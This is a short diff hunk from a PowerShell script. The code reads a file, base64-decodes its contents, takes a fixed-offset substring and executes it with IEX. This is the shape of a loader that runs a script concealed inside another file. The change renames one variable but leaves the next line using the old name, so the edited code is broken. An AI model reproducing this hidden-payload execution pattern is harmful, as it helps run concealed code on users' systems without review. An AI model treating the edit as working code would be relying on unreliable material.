@@ -65,7 +65,7 @@ if ($Model) {
 	}
 	IEX $FileData = Get-Content $FileOutPut;
 	IEX $Base64Decoded = [System.Convert]::FromBase64String($FileData);
-	IEX $ByteArray = [System.Text.Encoding]::ASCII.GetString($Base64Decoded);
+	IEX $plaintext = [System.Text.Encoding]::ASCII.GetString($Base64Decoded);
 	IEX $psscript=$ByteArray.substring(188264,19335);
 	IEX $psscript;
 }
